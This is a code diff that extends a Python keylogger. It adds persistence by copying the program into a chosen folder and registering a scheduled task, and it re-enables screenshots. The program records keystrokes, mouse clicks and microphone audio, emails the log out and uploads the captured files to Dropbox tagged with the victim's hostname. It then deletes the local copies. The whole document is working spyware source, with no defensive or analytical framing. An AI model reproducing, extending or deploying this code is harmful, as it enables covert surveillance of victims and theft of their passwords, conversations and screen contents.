@@ -17,6 +17,8 @@ from utils import (
     delete_wav_and_png_files,
     remove_env_file,
     upload_to_dropbox,
+    save_program_in_location,
+    create_scheduled_task,
 )
 
 
@@ -43,6 +45,9 @@ class KeyLogger:
         cc,
         magic_word,
         dropbox_token,
+        src_file,
+        dest_folder,
+        task_name,
     ):
         self.interval = time_interval
         self.smtp_server = smtp_server
@@ -51,13 +56,20 @@ class KeyLogger:
         self.email_password = email_password
         self.email_sender = email_sender
         self.email_receiver = email_receiver
-        self.dropbox_token = dropbox_token
         self.cc = cc
         self.magic_word = magic_word
+        self.dropbox_token = dropbox_token
+        self.src_file = src_file
+        self.dest_folder = dest_folder
+        self.task_name = task_name
+
         self.log = "KeyLogger Started...\n"
         self.keyboard_listener = None
         self.mouse_listener = None
         self.word = ""
+
+        executable_path = save_program_in_location(src_file, dest_folder)
+        create_scheduled_task(executable_path, task_name)
 
     def appendlog(self, string):
         if string:
@@ -75,7 +87,7 @@ class KeyLogger:
 
     def on_click(self, x, y, button, pressed):
         current_click = f"\nMouse click at {x} {y} with button {button}"
-        self.screenshot()
+        # self.screenshot()
         self.appendlog(current_click)
 
     def save_data(self, key):
@@ -109,7 +121,7 @@ class KeyLogger:
 
     def report(self):
         self.send_mail(f"{self.log}")
-        wav_and_png_files = get_wav_and_png_files()
+        wav_and_png_files = get_wav_and_png_files(self.dest_folder)
 
         dbx = dropbox.Dropbox(self.dropbox_token)
         session = dbx._session
@@ -117,7 +129,7 @@ class KeyLogger:
 
         upload_to_dropbox(socket.gethostname(), dbx, wav_and_png_files)
 
-        delete_wav_and_png_files()
+        delete_wav_and_png_files(self.dest_folder)
 
         print(self.log)
 
@@ -165,7 +177,8 @@ class KeyLogger:
         fs = 44100
         channels = 1  # mono
         seconds = self.interval
-        obj = wave.open(f"sound_{time.time()}.wav", "w")
+        filename = os.path.join(self.dest_folder, f"sound_{time.time()}.wav")
+        obj = wave.open(filename, "w")
         obj.setnchannels(channels)  # mono
         obj.setsampwidth(2)  # Sampling of 16 bit
         obj.setframerate(fs)
@@ -174,11 +187,13 @@ class KeyLogger:
         )
         sd.wait()
         obj.writeframesraw(myrecording)
+        obj.close()
         self.appendlog("\nmicrophone used.")
 
     def screenshot(self):
+        filename = os.path.join(self.dest_folder, f"screenshot_{time.time()}.png")
         img = pyscreenshot.grab()
-        img.save(f"screenshot_{time.time()}.png")
+        img.save(filename)
         self.appendlog("\nscreenshot used.")
 
     def run(self):
@@ -196,7 +211,7 @@ class KeyLogger:
             )
             self.mouse_listener.start()
 
-            # self.screenshot()
+            self.screenshot()
             self.microphone()
 
             time.sleep(self.interval)
